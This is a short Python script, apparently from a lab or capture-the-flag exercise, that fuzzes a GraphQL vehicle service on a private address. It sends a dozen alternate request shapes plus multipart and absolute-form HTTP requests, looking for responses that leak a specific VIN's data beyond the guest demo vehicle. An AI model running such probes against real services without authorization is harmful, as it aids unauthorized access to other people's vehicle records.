import requests, json
URL="http://10.230.164.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV6FF52FEE9EDDD86"
tests={
 "query=VIN": {"query":VIN},
 "query=demoVIN": {"query":"CV6000000DEMO0001"},
 "query=jsonstr": {"query":json.dumps({"vin":VIN})},
 "query=vinkey": {"query":'{"vin":"%s"}'%VIN},
 "query=id": {"query":"vehicle/"+VIN},
 "query=path": {"query":"/vehicles/"+VIN},
 "nested data": {"data":{"query":"{vehicles{vin}}"}},
 "nested payload": {"payload":{"query":"{vehicles{vin}}"}},
 "graphql key": {"graphql":{"query":"{vehicles{vin}}"}},
 "query+vin var": {"query":"query($v:String!){vehicle(vin:$v){vin}}","variables":{"v":VIN}},
 "query=blob": {"query":"a"*100},
 "query=null": {"query":None},
}
for name,body in tests.items():
    try:
        r=requests.post(URL,json=body,timeout=5)
        t=r.text.strip()
        print(("DIFF " if t!=BASE else "same ")+f"{name:16s} {r.status_code} {t[:160]}")
    except Exception as e: print("ERR",name,e)
# multipart
files={"query":(None,"{vehicles{vin}}")}
try:
    r=requests.post(URL,files=files,timeout=5); print("multipart",r.status_code,r.text[:200])
except Exception as e: print("multipart ERR",e)
# absolute-form
import socket
s=socket.socket(); s.settimeout(4); s.connect(("10.230.164.2",8080))
b=b'{"query":"{vehicles{vin}}"}'
s.sendall(b"POST http://10.230.164.2:8080/graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\nContent-Length: "+str(len(b)).encode()+b"\r\n\r\n"+b)
print("absolute-form:", repr(s.recv(400))); s.close()
